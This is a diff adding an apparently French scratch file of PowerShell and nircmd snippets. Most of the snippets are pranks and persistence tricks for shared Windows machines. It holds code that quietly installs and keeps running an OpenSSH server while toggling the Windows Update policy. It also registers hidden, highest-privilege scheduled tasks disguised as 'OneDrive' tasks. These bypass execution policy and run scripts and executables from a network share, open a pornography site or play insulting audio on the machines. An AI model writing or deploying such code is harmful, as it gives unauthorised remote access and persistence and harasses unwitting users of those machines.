@@ -1,0 +1,96 @@
+############################################################################################################################
+nircmd.exe nircmd.exe mutesysvolume 0
+############################################################################################################################
+(New-Object Media.SoundPlayer "C:\Windows\Media\Windows Notify System Generic.wav").PlaySync();
+############################################################################################################################
+changesysvolume 65535
+############################################################################################################################
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU
+############################################################################################################################
+Y:\nircmd.exe mediaplay 10000 "Y:\z.wav"
+############################################################################################################################
+Y:\nircmd.exe infobox "coucou" "jean"
+############################################################################################################################
+https://www.installerunserveur.com/configuration-vsftpd
+https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.3
+Configuration de l’ordinateur\Paramètres Windows\Paramètres de sécurité\Stratégies locales\Options de sécurité
+C:\Windows\System32\ssText3d.scr
+############################################################################################################################
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'UseWUServer' -Value 0
+Restart-Service -Name 'wuauserv'
+Start-Sleep -Seconds 1
+
+while ($true){
+
+    $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
+    $status_install = $status_install.State
+
+    if ($status_install -match "NotPresent"){
+        Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
+        Start-Service -Name sshd
+        Set-Service -Name sshd -StartupType Automatic
+    }    
+    
+    if ($status_install -match "Installed"){
+
+        $status_lanch = Get-Service -Name sshd 
+        $status_lanch = $status_lanch.Status
+
+            if ($status_lanch -notmatch "Running"){
+                Start-Service -Name sshd
+                Write-Host("Service DemarrÃ©")
+            }
+    }
+
+    Start-Sleep -Seconds 5
+
+}
+
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'UseWUServer' -Value 1
+###########################################################################################################################
+Add-Type -AssemblyName System.speech
+$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
+\\172.18.207.1\echange\nircmd.exe mutesysvolume 0
+\\172.18.207.1\echange\nircmd.exe setsysvolume 30000
+$speak.Speak("A batard t!u fume ?")
+###########################################################################################################################
+$currentUserWithDomain = (Get-WMIObject -class Win32_ComputerSystem).Username
+
+$actions = (New-ScheduledTaskAction -Execute 'cmd' -Argument '/C start /min py "\\172.18.207.1\echange\sc+\mousekeyboard.py"')
+$actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument "-WindowStyle Hidden -ExecutionPolicy bypass -Command "start /min py '\\172.18.207.1\echange\sc+\mousekeyboard.py'"")
+$actions = (New-ScheduledTaskAction -Execute '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"' -Argument "https://fr.pornhub.com")
+$actions = (New-ScheduledTaskAction -Execute 'cmd' -Argument "/C start /D /max 'C:\Program Files (x86)\Microsoft\Edge\Application\' msedge.exe http://172.18.203.26/csacb1b90b/home.htm")
+$actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-ExecutionPolicy bypass -Command "\\172.18.207.1\echange\sc+\enableDevice.exe"')
+
+$settings = New-ScheduledTaskSettingsSet -Hidden
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "$env:COMPUTERNAME\sio" -RunLevel Highest
+$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
+
+Register-ScheduledTask 'OneDrive 48S' -InputObject $task -User "$currentUserWithDomain" -Force
+
+Start-ScheduledTask 'OneDrive 48S'
+Unregister-ScheduledTask 'OneDrive 48S' -Confirm $false
+
+# Marine le pen : https://th.bing.com/th/id/OIP.4oT8WBBx9-182tAKAXbf4wHaE8?pid=ImgDet&rs=1
+#ph : https://fr.pornhub.com
+#test : cmd /C start /D /max "C:\Program Files (x86)\Microsoft\Edge\Application\" msedge.exe http://172.18.203.26/csacb1b90b/home.htm
+###########################################################################################################################
+\\172.18.207.1\echange\nircmd.exe mutesysvolume 0
+\\172.18.207.1\echange\nircmd.exe setsysvolume 65500
+(New-Object Media.SoundPlayer "\\172.18.207.1\echange\sc+\son\macronProjet.mp3").PlaySync();
+###########################################################################################################################
+Task sshblock:
+
+$currentUserWithDomain = (Get-WMIObject -class Win32_ComputerSystem).Username
+$actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-ExecutionPolicy bypass -WindowStyle Hidden -Command "\\172.18.207.1\echange\sc+\sshblock.ps1"')
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -Hidden
+$principal = New-ScheduledTaskPrincipal -UserId "$env:COMPUTERNAME\sio" -RunLevel Highest
+$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
+Register-ScheduledTask 'OneDrive Task 69000000-69000000' -InputObject $task -User "$currentUserWithDomain" -Force
+Start-ScheduledTask 'OneDrive Task 69000000-69000000'
+##############################################################################################################################
+powershell -ExecutionPolicy Bypass -F "\\172.18.207.1\echange\sc+\ExecShow.ps1"
+203.67
+201.101
